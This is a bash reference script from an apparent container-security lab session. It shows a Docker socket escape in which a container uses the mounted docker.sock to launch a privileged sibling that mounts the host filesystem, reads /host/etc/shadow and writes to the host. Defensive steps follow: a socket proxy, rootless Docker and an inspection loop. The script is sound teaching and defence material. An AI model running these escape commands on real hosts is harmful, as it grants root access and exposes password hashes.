#!/usr/bin/env bash
# Session 03 — commands run (reference; LAB BOX ONLY — gives real root on the host)

# --- Socket perms (first IOC) ---
ls -l /var/run/docker.sock          # srw-rw---- 1 root docker  (mode 660)
groups                              # am I in the docker group? (root-equivalent if yes)

# --- Attack A: socket escape (T1610 -> T1611) ---
docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock docker:cli sh
#   inside (unprivileged container):
#     docker ps                                             # lists HOST containers
#     docker run -it --rm --privileged -v /:/host alpine sh # daemon spawns privileged sibling
#       inside: cat /host/etc/shadow
#               echo "pwned $(whoami) $(date)" > /host/tmp/escape_proof.txt
cat /tmp/escape_proof.txt           # verify on host afterwards

# --- Attack contrast: no socket = no escape ---
docker run -it --rm docker:cli sh
#   inside: ls /var/run/docker.sock  -> No such file or directory
#           docker ps                -> Cannot connect to the Docker daemon

# --- Attack contrast: -v /:/host WITHOUT --privileged still reads host ---
docker run -it --rm -v /:/host alpine sh
#   inside: cat /host/etc/shadow     -> works (no --privileged needed)
#           ls /dev | wc -l          -> fewer devices than a privileged container

# --- Defend 1: socket proxy ---
docker run -d --name docker-proxy \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  -e CONTAINERS=1 -e POST=0 \
  -p 127.0.0.1:2375:2375 \
  tecnativa/docker-socket-proxy
docker run -it --rm -e DOCKER_HOST=tcp://127.0.0.1:2375 --network host docker:cli sh
#   inside: docker ps                              # WORKS (CONTAINERS=1)
#           docker run --privileged -v /:/host ...  # 403 Forbidden (POST=0)
docker rm -f docker-proxy

# --- Defend 2: rootless Docker ---
sudo apt-get install -y uidmap dbus-user-session
dockerd-rootless-setuptool.sh install            # run as the normal user, NOT root
export DOCKER_HOST=unix:///run/user/$(id -u)/docker.sock
docker info | grep -i rootless                   # rootless: true
#   re-run the socket escape against the rootless daemon:
#     cat /host/etc/shadow  -> Permission denied  (escape neutralised)

# --- Detect: config-time IOC loop ---
sudo docker ps -q | while read id; do
  echo "=== $id ==="
  sudo docker inspect --format 'Binds={{.HostConfig.Binds}} Priv={{.HostConfig.Privileged}}' "$id"
done

# cleanup
sudo docker ps -q | xargs -r sudo docker rm -f
